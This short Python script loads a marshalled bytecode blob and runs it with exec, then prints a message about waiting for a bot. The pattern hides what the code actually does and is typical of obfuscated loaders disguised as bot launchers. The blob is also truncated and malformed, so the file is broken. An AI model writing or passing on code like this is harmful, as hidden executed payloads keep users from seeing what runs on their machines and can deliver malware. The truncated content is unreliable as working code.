import marshal
marshalled_code = b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\>
compiled_code = marshal.loads(marshalled_code)
exec(compiled_code)
print("Running Wait for the bot to enter")
